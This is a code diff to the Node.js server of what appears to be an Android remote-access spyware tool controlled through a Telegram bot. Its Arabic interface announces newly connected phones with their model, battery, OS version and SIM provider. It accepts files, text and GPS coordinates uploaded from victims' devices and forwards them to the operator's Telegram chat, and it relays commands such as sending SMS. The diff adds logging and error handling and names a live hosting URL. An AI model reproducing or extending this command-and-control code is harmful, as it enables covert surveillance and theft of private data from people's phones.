@@ -2,7 +2,7 @@ const express = require("express");
 const webSocket = require("ws");
 const http = require("http");
 const telegramBot = require("node-telegram-bot-api");
-const uuid4 = require("uuid");
+const { v4: uuid4 } = require("uuid");
 const multer = require("multer");
 const bodyParser = require("body-parser");
 const axios = require("axios");
@@ -23,46 +23,130 @@ let currentUuid = "";
 let currentNumber = "";
 let currentTitle = "";
 
+// إضافة middleware للتحقق من أن السيرفر يعمل
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// debugging middleware
+app.use((req, res, next) => {
+    console.log('🟢 NEW REQUEST RECEIVED:', {
+        time: new Date().toISOString(),
+        method: req.method,
+        url: req.url,
+        ip: req.ip
+    });
+    next();
+});
+
+// مسار الاختبار
+app.get('/test', (req, res) => {
+    console.log('✅ Test endpoint hit - Server is working!');
+    res.json({ 
+        status: 'success', 
+        message: 'Server is running correctly',
+        timestamp: new Date().toISOString(),
+        url: 'https://king25.onrender.com'
+    });
+});
+
 app.get("/", function (req, res) {
-    res.send("<h1 align=\"center\">تم تحميل الخادم بنجاح</h1>");
+    console.log('✅ Home page visited');
+    res.send("<h1 align=\"center\">تم تحميل الخادم بنجاح ✅</h1>");
 });
 
 app.post("/uploadFile", upload.single("file"), (req, res) => {
+    console.log('=== UPLOAD FILE REQUEST ===');
+    console.log('File:', req.file);
+    console.log('Headers:', req.headers);
+    
+    if (!req.file) {
+        console.log('❌ NO FILE UPLOADED');
+        return res.status(400).send('No file uploaded');
+    }
+
     const filename = req.file.originalname;
-    appBot.sendDocument(id, req.file.buffer, {
-        caption: `• رسالة من <b>${req.headers.model}</b> جهاز`,
-        parse_mode: "HTML"
-    }, { filename: filename, contentType: "application/txt" });
+    
+    try {
+        appBot.sendDocument(id, req.file.buffer, {
+            caption: `• رسالة من <b>${req.headers.model}</b> جهاز`,
+            parse_mode: "HTML"
+        }, { filename: filename, contentType: req.file.mimetype });
+        console.log('✅ File sent to Telegram');
+    } catch (error) {
+        console.log('❌ Error sending to Telegram:', error);
+    }
+    
     res.send("");
 });
 
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body.text, { parse_mode: "HTML" });
+    console.log('=== UPLOAD TEXT REQUEST ===');
+    console.log('Body:', req.body);
+    console.log('Headers:', req.headers);
+    
+    if (!req.body.text) {
+        console.log('❌ NO TEXT IN BODY');
+        return res.status(400).send('No text in body');
+    }
+
+    try {
+        appBot.sendMessage(id, `• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body.text, { 
+            parse_mode: "HTML" 
+        });
+        console.log('✅ Text sent to Telegram');
+    } catch (error) {
+        console.log('❌ Error sending text to Telegram:', error);
+    }
+    
     res.send("");
 });
 
 app.post("/uploadLocation", (req, res) => {
-    appBot.sendLocation(id, req.body.lat, req.body.lon);
-    appBot.sendMessage(id, `• الموقع من <b>${req.headers.model}</b> جهاز`, { parse_mode: "HTML" });
+    console.log('=== UPLOAD LOCATION REQUEST ===');
+    console.log('Body:', req.body);
+    console.log('Headers:', req.headers);
+    
+    if (!req.body.lat || !req.body.lon) {
+        console.log('❌ NO LOCATION DATA');
+        return res.status(400).send('No location data');
+    }
+
+    try {
+        appBot.sendLocation(id, req.body.lat, req.body.lon);
+        appBot.sendMessage(id, `• الموقع من <b>${req.headers.model}</b> جهاز`, { parse_mode: "HTML" });
+        console.log('✅ Location sent to Telegram');
+    } catch (error) {
+        console.log('❌ Error sending location to Telegram:', error);
+    }
+    
     res.send("");
 });
 
 appSocket.on("connection", (ws, req) => {
-    const uuid = uuid4.v4();
+    console.log('=== NEW WEBSOCKET CONNECTION ===');
+    console.log('Headers:', req.headers);
+    
+    const uuid = uuid4();
     const model = req.headers.model;
     const battery = req.headers.battery;
     const version = req.headers.version;
     const brightness = req.headers.brightness;
     const provider = req.headers.provider;
+    
     ws.uuid = uuid;
     appClients.set(uuid, { model: model, battery: battery, version: version, brightness: brightness, provider: provider });
+    
+    console.log(`✅ New device connected: ${model} (${uuid})`);
+    
     appBot.sendMessage(id, `• جهاز جديد متصل✅\n\n` +
         `•  طراز الجهاز📱 : <b>${model}</b>\n` +
         `• بطارية 🔋 : <b>${battery}</b>\n` +
         `• نسخة أندرويد : <b>${version}</b>\n` +
         `• سطوع الشاشة  : <b>${brightness}</b>\n` +
         `• نوع الشرائح SIM : <b>${provider}</b>`, { parse_mode: "HTML" });
+        
     ws.on("close", function () {
+        console.log(`❌ Device disconnected: ${model} (${uuid})`);
         appBot.sendMessage(id, `• الجهاز غير متصل ❎\n\n` +
             `•  طراز الجهاز📱 : <b>${model}</b>\n` +
             `• بطارية 🔋 : <b>${battery}</b>\n` +
@@ -71,9 +155,17 @@ appSocket.on("connection", (ws, req) => {
             `• نوع الشرائح SIM : <b>${provider}</b>`, { parse_mode: "HTML" });
         appClients.delete(ws.uuid);
     });
+    
+    ws.on("error", function (error) {
+        console.log('🔴 WebSocket error:', error);
+    });
 });
 
 appBot.on("message", (msg) => {
+    console.log('=== TELEGRAM MESSAGE ===');
+    console.log('Message:', msg.text);
+    console.log('Chat ID:', msg.chat.id);
+    
     const chatId = msg.chat.id;
     if (msg.reply_to_message) {
         if (msg.reply_to_message.text.includes("يرى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه")) {
@@ -216,7 +308,10 @@ appBot.on("callback_query", (callback) => {
     const data = callback.data;
     const action = data.split(":")[0];
     const uuid = data.split(":")[1];
-    console.log(uuid);
+    console.log('=== CALLBACK QUERY ===');
+    console.log('Action:', action);
+    console.log('UUID:', uuid);
+    
     if (action == "device") {
         appBot.editMessageText(`• حدد الجهاز لتنفيذ الأثناء : <b>${appClients.get(data.split(":")[1]).model}</b>`, {
             width: 10000, chat_id: id, message_id: message.message_id, reply_markup: {
@@ -385,4 +480,19 @@ setInterval(function () {
     } catch (e) { }
 }, 5000);
 
-appServer.listen(process.env.PORT || 8999);
+// إعداد البورت الصحيح
+const PORT = process.env.PORT || 10000;
+appServer.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🌐 Server URL: https://king25.onrender.com`);
+    console.log(`✅ Test endpoint: https://king25.onrender.com/test`);
+});
+
+// معالجة الأخطاء
+process.on('uncaughtException', (error) => {
+    console.log('🔴 Uncaught Exception:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.log('🔴 Unhandled Rejection at:', promise, 'reason:', reason);
+});
